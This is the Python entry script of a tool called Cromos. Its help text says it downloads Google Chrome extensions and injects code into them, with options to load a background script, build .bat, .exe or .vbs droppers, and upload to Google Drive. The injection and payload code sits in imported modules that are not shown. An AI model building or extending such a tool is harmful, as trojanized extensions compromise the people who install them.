#!/usr/bin/python

import argparse
import sys
import libs.crx
from libs.crx import Cromos
from libs.drive import Drive
from libs.build import Build
from libs.loader import Loader
from libs.colors import Colors


def main() :

	
	global color

	color = Colors()

	def banner() : 

		banner = """
         (         )      *         )    (     
   (     )\ )   ( /(    (  `     ( /(    )\ )  
   )\   (()/(   )\())   )\))(    )\())  (()/(  
 (((_)   /(_)) ((_)\   ((_)()\  ((_)\    /(_)) 
 )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
 | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
  \___| |_|_\   \___/  |_|  |_|  \___/  |___/
	 """
		print(color.error("{}".format(banner)))
		print("  Version: {} Builds: {} Modules: {}\n".format("1.0","3", "2"))

	def help () :

		global extension, build, apikey, module

		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, default="", required=True)
		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
		parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
		parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)

		args = parser.parse_args()

		extension = args.extension # Extensao ID
		build = args.build # Tipo do arquivo que devera ser gerado apos os injections
		apikey = args.key # API key par ao dropbox
		module = args.load # Pasta de saida para os arquivos

		if len(sys.argv) <= 2 :
			parser.print_help()
	help()
	banner()

	cromos = Cromos(extension)	
	cromos.download()
	cromos.unpack()
	cromos.extract()

if __name__== "__main__" :

	main()